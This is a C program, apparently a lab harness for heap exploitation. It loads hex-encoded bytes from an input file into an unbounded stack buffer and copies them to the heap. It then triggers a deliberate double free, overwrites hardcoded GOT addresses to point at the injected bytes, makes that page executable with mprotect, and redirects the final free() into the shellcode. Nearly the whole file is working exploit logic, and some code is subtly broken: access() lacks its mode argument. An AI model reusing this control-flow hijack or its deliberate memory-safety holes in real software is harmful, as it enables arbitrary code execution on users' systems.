// gcc -o double_free double_free.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <stdint.h>

#define SIZE 200

unsigned char *p0;
unsigned char *p1;
unsigned char *p2;

void attack(){

	unsigned long **LOCATION = (unsigned long **)0x0000000000601090;
	*LOCATION = (unsigned long *)0x00000000000601018;
	**LOCATION = (unsigned long) (p2+32);
	mprotect((void *)((uint64_t)p2 & ~4095),4096,PROT_WRITE|PROT_READ|PROT_EXEC);

}

int main(){
	if (access("./output/double_free_injection_output.c")){
		remove("./output/double_free_injection_output.c");
	}

	char file_name[] = "./input/input.txt";
	char buf[SIZE];
	FILE *fp;
    int v,length=0;
    if((fp=fopen(file_name,"r"))==NULL){
        printf("open file error!!!\n");
        return 0;
   	}
   	while (fscanf(fp, "\\x%02x", &v) == 1){
        buf[length++] = v;
    }
	fclose(fp);
	
	/*for(int i = 0;i<length;i++){
		printf("%c",(p2+24)[i]);
	}*/
	
	p0 = malloc(448);
	p1 = malloc(512);
	free(p0);
	free(p1);
	p2 = malloc(768);

	memcpy(p2, buf, length);
/*
	*(unsigned long *)p0 = 0;		//0x0000000000000000
	*(unsigned long *)(p0+8) = 448+1;	//0x00000000000001c1
	*(unsigned long *)(p0+16) = (unsigned long)0x0000000000601090-24;
	*(unsigned long *)(p0+24) = (unsigned long)0x0000000000601090-16;
	*(unsigned long *)(p1-16) = 448;	//0x00000000000001c0;
	*(unsigned long *)(p1-8) = 320;		//0x0000000000000140
*/
	
	free(p1);	                  	//double free

	attack();
	free(p2);				//call free(call shellcode)
	
	return 0;

}
